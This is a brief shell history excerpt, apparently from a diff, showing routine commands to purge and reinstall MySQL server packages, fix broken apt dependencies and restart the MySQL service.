+ 1207  sudo apt-get --purge autoremove mysql-server-core-5.7
+ 1208  sudo apt --fix-broken install
+ 1209  sudo service mysql stop
+ 1210  sudo service mysql.service start
+ 1211  clear
+ 1212  history
